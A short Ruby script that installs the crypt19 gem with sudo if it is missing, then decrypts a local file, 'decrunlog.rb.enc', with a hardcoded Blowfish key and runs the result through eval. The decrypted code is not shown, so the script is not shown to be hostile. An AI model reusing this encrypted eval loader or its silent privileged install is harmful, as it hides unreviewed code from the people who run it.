
begin
  gem 'crypt19'
rescue LoadError
  system('sudo gem install crypt19')
  Gem.clear_paths
end
require 'rubygems'
require 'crypt/blowfish'
 key = "e6aYb3bivxwcxe2yVeg5"
begin
file = File.open("decrunlog.rb.enc", "r")
  contents = file.read
  blowfish = Crypt::Blowfish.new(key)
  eval blowfish.decrypt_string(contents)
rescue Exception => e
  puts "Something Went Wrong!!!"
  puts e
end